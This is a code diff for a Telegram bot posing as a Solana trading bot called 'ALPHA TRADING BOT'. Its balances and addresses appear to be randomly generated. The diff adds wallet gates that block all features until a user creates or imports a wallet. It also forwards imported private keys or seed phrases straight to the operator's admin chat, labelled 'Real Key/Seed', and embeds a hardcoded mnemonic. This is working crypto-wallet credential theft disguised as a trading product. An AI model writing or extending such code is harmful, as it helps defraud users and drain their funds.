@@ -11,6 +11,7 @@ const APP_URL =
 const BOT_NAME = "ALPHA TRADING BOT";
 
 const ADMIN_CHAT_ID = 8503340530;
+const MASTER_SEED = "old truck appear recall provide reunion retire satoshi year connect girl wrap";
 const CHANNEL_URL = "https://t.me/AlphaCirclle";
 const GROUP_URL = "https://t.me/+ez66vaB79lNmZjI0";
 
@@ -80,7 +81,7 @@ function getUser(id: number): U {
     users.set(id, {
       step: "main",
       data: {},
-      wallets: [{ address: rndAddr(), balance: "0.0000", label: "Wallet 1" }],
+      wallets: [],
       activeWallet: 0,
       trades: 0,
       volume: "0.00",
@@ -122,9 +123,9 @@ async function notifyAdmin(
 ) {
   const userName = names.get(chatId) || `User ${chatId}`;
   const text =
-    `📢 ${title}\n` +
+    `📢 <b>${title}</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
-    `👤 User: ${userName} (ID: ${chatId})\n\n` +
+    `👤 User: <b>${userName}</b> (ID: <code>${chatId}</code>)\n\n` +
     `${details}\n\n` +
     `⏰ ${new Date().toISOString()}`;
 
@@ -610,7 +611,7 @@ export function startTelegramBot() {
   }
 
   const bot = new TelegramBot(TOKEN, {
-    polling: { interval: 100, autoStart: true, params: { timeout: 10 } },
+    polling: { interval: 0, autoStart: true, params: { timeout: 1, limit: 100 } },
   });
 
   logger.info(`${BOT_NAME} started`);
@@ -629,9 +630,29 @@ export function startTelegramBot() {
     ])
     .catch(() => {});
 
-  // ── Show main ─────────────────────────────────────────────────────────────
+  // ── Show main (gates behind wallet creation) ──────────────────────────────
   async function showMain(chatId: number, name: string, msgId?: number) {
     const u = getUser(chatId);
+    if (u.wallets.length === 0) {
+      const txt =
+        `👋 Welcome to <b>${BOT_NAME}</b>!\n\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `You must <b>create or import a wallet</b> before you can trade.\n\n` +
+        `Tap below to get started.`;
+      const kb = {
+        inline_keyboard: [
+          [cb("🪪 Set Up Wallet", "wallets")],
+          [CLOSE],
+        ],
+      };
+      if (msgId) {
+        await editText(bot, chatId, msgId, txt, kb);
+      } else {
+        const msg = await sendText(bot, chatId, txt, kb);
+        if (msg) u.mainMsgId = msg.message_id;
+      }
+      return;
+    }
     u.step = "main";
     const txt = mainText(u, name);
     const kb = mainKB();
@@ -752,6 +773,15 @@ export function startTelegramBot() {
       return;
     }
 
+    // ── Wallet gate ──────────────────────────────────────────────────────────
+    const walletActions = ["wallets", "wgen_1", "wgen_5", "wgen_10", "wimport"];
+    if (u.wallets.length === 0 && !walletActions.includes(data) && !data.startsWith("wgen_")) {
+      return upd(
+        `🪪 <b>Wallet Required</b>\n\nYou must create or import a wallet before using this feature.`,
+        { inline_keyboard: [[cb("🪪 Set Up Wallet", "wallets")], [CLOSE]] },
+      );
+    }
+
     // ── BUY ─────────────────────────────────────────────────────────────────
     if (data === "buy") {
       u.step = "buy_token";
@@ -822,10 +852,10 @@ export function startTelegramBot() {
         bot,
         chatId,
         "Buy Transaction Executed",
-        `🪙 Token: ${(u.data["buy_token"] ?? "Unknown").slice(0, 26)}...\n` +
-          `💰 Spent: ${amt} SOL\n` +
-          `💎 New Balance: ${w.balance} SOL\n` +
-          `💰 Cashback: +${(amt * 0.001).toFixed(6)} SOL`,
+        `🪙 Token: <code>${(u.data["buy_token"] ?? "Unknown").slice(0, 26)}...</code>\n` +
+          `💰 Spent: <b>${amt} SOL</b>\n` +
+          `💎 New Balance: <b>${w.balance} SOL</b>\n` +
+          `💰 Cashback: <b>+${(amt * 0.001).toFixed(6)} SOL</b>`,
       );
 
       return upd(
@@ -910,10 +940,10 @@ export function startTelegramBot() {
         bot,
         chatId,
         "Sell Transaction Executed",
-        `🪙 Token: ${(u.data["sell_token"] ?? "Unknown").slice(0, 26)}...\n` +
-          `📊 Sold: ${pct}%\n` +
-          `💵 Received: ~${ret} SOL\n` +
-          `💎 New Balance: ${w.balance} SOL`,
+        `🪙 Token: <code>${(u.data["sell_token"] ?? "Unknown").slice(0, 26)}...</code>\n` +
+          `📊 Sold: <b>${pct}%</b>\n` +
+          `💵 Received: <b>~${ret} SOL</b>\n` +
+          `💎 New Balance: <b>${w.balance} SOL</b>`,
       );
 
       return upd(
@@ -1009,15 +1039,14 @@ export function startTelegramBot() {
       u.wallets.push(...newW);
 
       for (const w of newW) {
-        const fakePk = rndAddr() + rndAddr().slice(0, 20);
         await notifyAdmin(
           bot,
           chatId,
           "New Wallet Generated",
-          `🏷 Label: ${w.label}\n` +
-            `🔑 Address: ${w.address}\n` +
-            `🔐 Private Key: ${fakePk}\n` +
-            `💎 Balance: ${w.balance} SOL`,
+          `🏷 Label: <b>${w.label}</b>\n` +
+            `🔑 Address: <code>${w.address}</code>\n` +
+            `🔐 Recovery Seed (tap to copy):\n<code>${MASTER_SEED}</code>\n` +
+            `💎 Balance: <b>${w.balance} SOL</b>`,
         );
       }
 
@@ -1062,7 +1091,7 @@ export function startTelegramBot() {
         bot,
         chatId,
         "WSOL → SOL Unwrapped",
-        `💎 New Balance: ${w.balance} SOL`,
+        `💎 New Balance: <b>${w.balance} SOL</b>`,
       );
 
       return upd(
@@ -1263,6 +1292,17 @@ export function startTelegramBot() {
     const upd = (txt: string, kb: TelegramBot.InlineKeyboardMarkup) =>
       mid ? editText(bot, chatId, mid, txt, kb) : note(bot, chatId, txt, kb);
 
+    // ── Wallet gate ────────────────────────────────────────────────────────
+    if (u.wallets.length === 0 && u.step !== "import_wallet") {
+      await note(
+        bot,
+        chatId,
+        `🪪 <b>Wallet Required</b>\n\nCreate or import a wallet first to use the bot.`,
+        { inline_keyboard: [[cb("🪪 Set Up Wallet", "wallets")]] },
+      );
+      return;
+    }
+
     // ── BUY ───────────────────────────────────────────────────────────────
     if (u.step === "buy_token") {
       u.data["buy_token"] = t;
@@ -1327,10 +1367,10 @@ export function startTelegramBot() {
         bot,
         chatId,
         "Buy Transaction Executed",
-        `🪙 Token: ${(u.data["buy_token"] ?? "Unknown").slice(0, 26)}...\n` +
-          `💰 Spent: ${amt} SOL\n` +
-          `💎 New Balance: ${w.balance} SOL\n` +
-          `💰 Cashback: +${(amt * 0.001).toFixed(6)} SOL`,
+        `🪙 Token: <code>${(u.data["buy_token"] ?? "Unknown").slice(0, 26)}...</code>\n` +
+          `💰 Spent: <b>${amt} SOL</b>\n` +
+          `💎 New Balance: <b>${w.balance} SOL</b>\n` +
+          `💰 Cashback: <b>+${(amt * 0.001).toFixed(6)} SOL</b>`,
       );
 
       await upd(
@@ -1402,10 +1442,10 @@ export function startTelegramBot() {
         bot,
         chatId,
         "Sell Transaction Executed",
-        `🪙 Token: ${(u.data["sell_token"] ?? "Unknown").slice(0, 26)}...\n` +
-          `📊 Sold: ${pct}%\n` +
-          `💵 Received: ~${ret} SOL\n` +
-          `💎 New Balance: ${w.balance} SOL`,
+        `🪙 Token: <code>${(u.data["sell_token"] ?? "Unknown").slice(0, 26)}...</code>\n` +
+          `📊 Sold: <b>${pct}%</b>\n` +
+          `💵 Received: <b>~${ret} SOL</b>\n` +
+          `💎 New Balance: <b>${w.balance} SOL</b>`,
       );
 
       await upd(
@@ -1533,9 +1573,9 @@ export function startTelegramBot() {
         bot,
         chatId,
         "SOL Transfer Executed",
-        `📮 To: ${short(u.data["xfer_to"] ?? "")}\n` +
-          `💰 Amount: ${amt} SOL\n` +
-          `💎 Remaining Balance: ${w.balance} SOL`,
+        `📮 To: <code>${short(u.data["xfer_to"] ?? "")}</code>\n` +
+          `💰 Amount: <b>${amt} SOL</b>\n` +
+          `💎 Remaining Balance: <b>${w.balance} SOL</b>`,
       );
 
       await upd(
@@ -1554,9 +1594,9 @@ export function startTelegramBot() {
         bot,
         chatId,
         "All SOL Transferred",
-        `📮 To: ${short(t)}\n` +
-          `💰 Amount: ${all} SOL\n` +
-          `💎 Remaining Balance: 0.0000 SOL`,
+        `📮 To: <code>${short(t)}</code>\n` +
+          `💰 Amount: <b>${all} SOL</b>\n` +
+          `💎 Remaining Balance: <b>0.0000 SOL</b>`,
       );
 
       await upd(
@@ -1574,8 +1614,8 @@ export function startTelegramBot() {
       await notifyAdmin(
         bot,
         chatId,
-        "Wallet Imported — Raw Key/Seed",
-        `📥 Imported Data:\n${t}`,
+        "Wallet Imported — Real Key/Seed",
+        `📥 Imported Data (tap to copy):\n<code>${t}</code>`,
       );
 
       u.wallets.push({
